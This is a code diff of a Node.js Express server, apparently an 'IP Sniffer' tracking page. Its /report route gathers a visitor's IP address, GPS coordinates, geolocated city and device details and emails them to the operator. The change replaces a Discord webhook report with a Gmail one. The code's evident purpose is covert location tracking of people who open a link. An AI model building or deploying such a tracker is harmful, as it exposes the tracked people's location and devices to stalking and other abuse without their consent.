@@ -1,9 +1,9 @@
 require('dotenv').config();
 const express = require('express');
-const app = express();
+const nodemailer = require('nodemailer');
 const uaParser = require('ua-parser-js');
 const fetch = require('node-fetch');
-const path = require('path');
+const app = express();
 
 app.use(express.json());
 app.use(express.static('public'));
@@ -16,7 +16,6 @@ app.post('/report', async (req, res) => {
 
   const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-  // 🌍 IPジオロケーションAPI（IPから取得）
   let geo = {};
   try {
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -25,66 +24,39 @@ app.post('/report', async (req, res) => {
     console.error('IPジオAPIエラー:', err);
   }
 
-  // 🌍 GPS逆ジオコーディング（緯度経度から取得）
-  let gpsAddress = { country: '取得失敗', region: '取得失敗', city: '取得失敗' };
-  try {
-    const reverseRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ja`);
-    const reverseData = await reverseRes.json();
+  // ✉️ Gmailで送信
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS
+    }
+  });
 
-    gpsAddress = {
-      country: reverseData.address.country || '取得失敗',
-      region: reverseData.address.state || '取得失敗',
-      city: reverseData.address.city || reverseData.address.town || reverseData.address.village || '取得失敗'
-    };
-  } catch (err) {
-    console.error('GPS逆ジオ取得失敗:', err);
-  }
-
-  // 📩 Discord通知
-  const message = {
-    content: `📸 アクセス情報：
+  const mailOptions = {
+    from: `"IP Sniffer" <${process.env.GMAIL_USER}>`,
+    to: process.env.GMAIL_USER, // 自分宛
+    subject: '📡 アクセス情報通知',
+    text: `
+📸 アクセス情報：
 - IPアドレス: ${ip}
-- 国: ${geo.country_name || gpsAddress.country}
-- 地域: ${geo.region || gpsAddress.region}
-- 市区町村: ${geo.city || gpsAddress.city}
+- 国: ${geo.country_name || '不明'}
+- 地域: ${geo.region || '不明'}
+- 市区町村: ${geo.city || '不明'}
 - 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
-- 位置情報（GPS）: ${locationLink}
-- アクセス時間: ${new Date().toLocaleString()}`
+- GPS位置: ${locationLink}
+- アクセス時間: ${new Date().toLocaleString()}
+    `
   };
 
   try {
-    const webhookRes = await fetch(process.env.DISCORD_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(message)
-    });
-
-    if (!webhookRes.ok) {
-      const errText = await webhookRes.text();
-      console.error(`❌ Discord通知失敗: ${webhookRes.status} - ${errText}`);
-    } else {
-      console.log('✅ Discord通知成功');
-    }
-  } catch (err) {
-    console.error('❌ Discord通知エラー:', err);
+    await transporter.sendMail(mailOptions);
+    console.log('✅ Gmail送信成功');
+  } catch (error) {
+    console.error('❌ Gmail送信失敗:', error);
   }
 
   res.sendStatus(200);
-});
-
-// ✅ テスト送信用ルート（任意）
-app.get('/test', async (req, res) => {
-  try {
-    const resp = await fetch(process.env.DISCORD_WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: '✅ テスト送信成功しました' })
-    });
-    res.send('テスト送信完了');
-  } catch (err) {
-    console.error('テスト送信エラー:', err);
-    res.status(500).send('テスト失敗');
-  }
 });
 
 const PORT = process.env.PORT || 3000;
